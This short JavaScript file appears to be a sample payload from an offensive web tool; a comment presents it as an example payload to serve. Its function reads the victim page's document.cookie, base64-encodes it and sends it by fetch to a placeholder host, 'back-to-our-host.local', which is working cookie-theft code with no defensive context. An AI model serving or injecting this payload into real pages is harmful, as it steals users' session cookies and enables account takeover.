// This is just an example payload that you could serve

async function runPayload(){
    console.log("OMNOMNOMNOM, COOKIES")
    let result = await fetch(`http://back-to-our-host.local/?q=${btoa(escape(document.cookie))}`)
}

runPayload()